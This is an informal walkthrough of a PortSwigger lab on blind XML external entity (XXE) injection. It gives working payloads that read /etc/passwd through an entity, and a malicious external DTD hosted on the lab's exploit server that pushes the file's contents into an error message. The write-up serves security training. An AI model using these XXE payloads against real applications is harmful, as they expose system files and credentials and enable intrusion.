https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages


This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

1) perform a POST request to /product/stock
    it is possible to see that in the body we have a XML

2) try to insert in this xml body 

    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
    <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

    the server replies that is not possible to define external entities 

    BUT 


    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "invalid url"> %xxe;]> 

    the server replies with an error so this means that is vulnerable to xxe



3) so what we can do is to force the server to include a external entity using a dtd (Document Type Definition) in xml
    so on the exploit server we can define
    
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
    %eval;
    %exfil;

    then in the body of the POST request we insert 
    
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a0c00590474d93e80af48b201ff0092.exploit-server.net/exploit.dtd"> %xxe;]>


NOTE: save the file on the exploit server it as .dtd



4) the entity eval will trigger an error and prints also the content of file
